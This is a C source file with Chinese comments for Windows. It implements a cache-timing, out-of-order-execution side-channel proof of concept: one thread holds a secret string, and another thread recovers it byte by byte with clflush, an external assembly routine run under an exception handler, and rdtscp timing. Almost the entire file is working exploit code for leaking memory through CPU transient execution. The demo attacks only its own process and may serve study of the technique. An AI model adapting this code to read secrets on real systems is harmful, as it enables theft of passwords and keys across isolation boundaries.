#include <stdio.h>
#include <intrin.h>
#include <excpt.h>
#include <stdint.h>
#include <locale.h>
#include <Windows.h>
#include <stdlib.h>  

#define NUM_READS 100  //受害者线程连续读取密码次数。
#define PROCESSOR_AFFINITY_CORE0 1 // 假设第一个CPU核心的掩码是1  


uint8_t probe_array[256][4096];
uint64_t access_time[256];

void OutOfOrderExecution(void* target, void* probe_array, void* null);//汇编函数以实现精确操作

// 全局变量存储密码  
uint64_t secret_address;//64位操作系统的指针大小为8字节64位无符号整数

uint8_t Steal(uint8_t* target)
{
    for (size_t retries = 0; retries < 30000; retries++)
    {
        for (size_t i = 0; i < 256; i++)
        {
            _mm_clflush(&probe_array[i]);
            _mm_pause();
        }

        __try
        {
            OutOfOrderExecution(target, probe_array, NULL);
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {}

        for (size_t i = 0; i < 256; i++)
        {
            uint32_t aux = 0;
            uint64_t a = __rdtscp(&aux);
            probe_array[i][0]++;
            uint64_t b = __rdtscp(&aux);
            access_time[i] = b - a;
        }

        size_t idx_min = 0;
        for (size_t i = 0; i < 256; i++)
        {
            if (access_time[i] < access_time[idx_min]) idx_min = i;
            _mm_pause();
        }

        if (access_time[idx_min] < 100 && idx_min != 0)
        {
            printf(" => %02X retries=%-5zd access_time=%llu\n"
                , (uint32_t)idx_min
                , retries
                , access_time[idx_min]
            );
            return (uint8_t)idx_min;
        }

        _mm_pause();
    }

    printf(" => 00\n");
    return 0;
}

// 读取密码的子线程函数  
DWORD WINAPI readPassword(LPVOID lpParam) {
    //固定在1号cpu核心上运行
    if (!SetThreadAffinityMask(GetCurrentThread(), PROCESSOR_AFFINITY_CORE0)) {
        wprintf(L"Error setting thread affinity mask: %lu\n", GetLastError());
    }
    uint64_t* p_secret_address = (uint64_t*)lpParam;
    char secret[20] = "hello_world!";
    *p_secret_address = &secret;
    printf("read_address : %p\n", *p_secret_address);
    int i;
    for (i = 0; i < NUM_READS; i++) {

        Sleep(500);
        // 读取密码  
        char* temp = secret;
    }
    return 0;
}

//仅根据密码地址利用乱序执行获取密码的攻击者线程。
DWORD WINAPI stealPassword(LPVOID lpParam) {
    //固定在1号cpu核心上运行
    if (!SetThreadAffinityMask(GetCurrentThread(), PROCESSOR_AFFINITY_CORE0)) {
        wprintf(L"Error setting thread affinity mask: %lu\n", GetLastError());
    }
    uint64_t* target = (uint64_t*)lpParam;
    printf("stealing target address: %p\n", *target);
    uint8_t buffer[32] = { 0 };

    for (size_t i = 0; i < sizeof(buffer); i++)
    {
        printf("Steal#%-2zd", i);
        buffer[i] = Steal(*target + i);
    }

    for (size_t i = 0; i < sizeof(buffer); i++)
        putchar(buffer[i]);

    putchar('\n');

    return 0;
}

int main(int argc, char* argv[])
{
    HANDLE Thread_1, Thread_2;
    DWORD dwThreadId_1, dwThreadId_2;
    Thread_1 = CreateThread(NULL, 0, readPassword, (LPVOID)&secret_address, 0, &dwThreadId_1);
    if (Thread_1 == NULL) {
        fprintf(stderr, "Error creating thread: %lu\n", GetLastError());
        return 1;
    }
    Sleep(500);//等线程1返回私有变量地址。
    Thread_2 = CreateThread(NULL, 0, stealPassword, (LPVOID)&secret_address, 0, &dwThreadId_2);
    if (Thread_2 == NULL) {
        fprintf(stderr, "Error creating thread: %lu\n", GetLastError());
        return 1;
    }
    WaitForSingleObject(Thread_2, INFINITE);//等待线程2结束

    CloseHandle(Thread_1);
    CloseHandle(Thread_2);

    return 0;
}